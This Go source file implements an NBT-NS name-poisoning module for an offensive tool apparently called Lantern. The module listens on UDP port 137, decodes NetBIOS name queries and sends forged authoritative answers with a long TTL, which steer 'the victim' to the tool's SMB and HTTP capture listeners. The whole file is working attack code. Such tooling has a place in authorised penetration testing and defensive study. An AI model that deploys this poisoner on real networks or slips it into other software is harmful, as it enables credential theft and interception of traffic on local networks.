// Package nbtns implements a NetBIOS Name Service (NBT-NS) poisoner. It
// listens on UDP 137 and answers NB name queries with Lantern's IPv4 address,
// coaxing the victim into connecting to our capture listeners (SMB, HTTP, ...).
package nbtns

import (
	"context"
	"fmt"
	"net"
	"strings"
	"sync"
	"time"

	"lantern/internal/core"
)

const (
	ServiceName = "nbtns"
	DefaultPort = 137
)

type Module struct {
	Address string
	Port    int
	Logger  *core.Logger

	// ResponseIP overrides the IPv4 address handed out in poisoned answers.
	// When empty it is resolved from the configured interface or auto-detected.
	ResponseIP string

	mu     sync.Mutex
	conn   *net.UDPConn
	cancel context.CancelFunc
}

func New(logger *core.Logger) *Module {
	return &Module{Address: "0.0.0.0", Port: DefaultPort, Logger: logger}
}

func (m *Module) Name() string      { return ServiceName }
func (m *Module) HasListener() bool { return false }
func (m *Module) HasPoisoner() bool { return true }

func (m *Module) StartListener(context.Context, core.Config) error {
	return fmt.Errorf("NBT-NS has no listener; it is a poisoner")
}

func (m *Module) StartPoisoner(ctx context.Context, cfg core.Config) error {
	m.mu.Lock()
	defer m.mu.Unlock()
	if m.conn != nil {
		return fmt.Errorf("NBT-NS poisoner is already running")
	}

	ip, err := m.responseIPv4(cfg)
	if err != nil {
		return err
	}

	bindAddress := m.Address
	if cfg.InterfaceAddress != "" {
		bindAddress = cfg.InterfaceAddress
	}
	addr := net.JoinHostPort(bindAddress, fmt.Sprint(m.Port))
	udpAddr, err := net.ResolveUDPAddr("udp4", addr)
	if err != nil {
		return fmt.Errorf("resolve listen address: %w", err)
	}
	conn, err := net.ListenUDP("udp4", udpAddr)
	if err != nil {
		return fmt.Errorf("bind UDP %s: %w", addr, err)
	}

	runCtx, cancel := context.WithCancel(ctx)
	m.conn = conn
	m.cancel = cancel
	m.log(core.Success, "Poisoning on %s, answering with %s", addr, ip)
	go m.serve(runCtx, conn, ip.To4())
	return nil
}

func (m *Module) serve(ctx context.Context, conn *net.UDPConn, ip net.IP) {
	defer func() {
		_ = conn.Close()
		m.mu.Lock()
		if m.conn == conn {
			m.conn = nil
			m.cancel = nil
		}
		m.mu.Unlock()
	}()

	go func() {
		<-ctx.Done()
		_ = conn.SetReadDeadline(time.Now())
	}()

	buf := make([]byte, 4096)
	for {
		n, peer, err := conn.ReadFromUDP(buf)
		if err != nil {
			if ctx.Err() != nil {
				return
			}
			if ne, ok := err.(net.Error); ok && ne.Timeout() {
				continue
			}
			m.packet("ERROR", "UDP receive error: %v", err)
			return
		}

		packet := buf[:n]
		// A NBT-NS name query has flags 0x0110 and a single question of 34 bytes
		// starting at offset 12 (length byte, 32 encoded chars, null terminator).
		if n < 50 || packet[2] != 0x01 || packet[3] != 0x10 || packet[12] != 0x20 {
			continue
		}

		name, suffix := decodeNBTName(packet[13:45])
		m.packet("QUERY", "from=%s name=%q suffix=0x%02x (%s)",
			peer.IP, name, suffix, nbtRole(suffix))

		response := buildNBTAnswer(packet, ip)
		if _, err := conn.WriteToUDP(response, peer); err != nil {
			m.packet("ERROR", "Send response to %s: %v", peer, err)
			continue
		}
		m.packet("POISON", "Answered %s: %s -> %s", peer.IP, name, ip)
	}
}

// decodeNBTName reverses the first-level NetBIOS name encoding of the 32 encoded
// bytes, returning the trimmed name and the service suffix byte.
func decodeNBTName(encoded []byte) (string, byte) {
	if len(encoded) != 32 {
		return "", 0
	}
	decoded := make([]byte, 16)
	for i := 0; i < 16; i++ {
		hi := encoded[i*2] - 0x41
		lo := encoded[i*2+1] - 0x41
		decoded[i] = hi<<4 | (lo & 0x0f)
	}
	suffix := decoded[15]
	name := strings.TrimRight(string(decoded[:15]), " \x00")
	return name, suffix
}

func nbtRole(suffix byte) string {
	switch suffix {
	case 0x00:
		return "Workstation/Redirector"
	case 0x03:
		return "Messenger"
	case 0x1b:
		return "Domain Master Browser"
	case 0x1c:
		return "Domain Controller"
	case 0x1d:
		return "Master Browser"
	case 0x1e:
		return "Browser Election"
	case 0x20:
		return "File Server"
	default:
		return "Service not known"
	}
}

func buildNBTAnswer(query []byte, ip net.IP) []byte {
	resp := make([]byte, 0, 62)
	resp = append(resp, query[0:2]...)          // Transaction ID
	resp = append(resp, 0x85, 0x00)             // Flags: response, authoritative
	resp = append(resp, 0x00, 0x00)             // Questions
	resp = append(resp, 0x00, 0x01)             // Answer RRs
	resp = append(resp, 0x00, 0x00)             // Authority RRs
	resp = append(resp, 0x00, 0x00)             // Additional RRs
	resp = append(resp, query[12:46]...)        // Encoded name (len + 32 + null)
	resp = append(resp, 0x00, 0x20)             // Type: NB
	resp = append(resp, 0x00, 0x01)             // Class: IN
	resp = append(resp, 0x00, 0x04, 0x93, 0xe0) // TTL (~3 days)
	resp = append(resp, 0x00, 0x06)             // RDLENGTH
	resp = append(resp, 0x00, 0x00)             // NB flags
	resp = append(resp, ip.To4()...)            // Address
	return resp
}

func (m *Module) responseIPv4(cfg core.Config) (net.IP, error) {
	if m.ResponseIP != "" {
		ip := net.ParseIP(m.ResponseIP)
		if ip == nil || ip.To4() == nil {
			return nil, fmt.Errorf("invalid IPv4 ResponseIP %q", m.ResponseIP)
		}
		return ip.To4(), nil
	}
	return cfg.ResponseIPv4()
}

func (m *Module) log(level core.Level, format string, args ...any) {
	if m.Logger != nil {
		m.Logger.Print(level, "NBTNS", format, args...)
	}
}

func (m *Module) packet(packetType, format string, args ...any) {
	if m.Logger != nil {
		m.Logger.Packet(ServiceName, packetType, format, args...)
	}
}
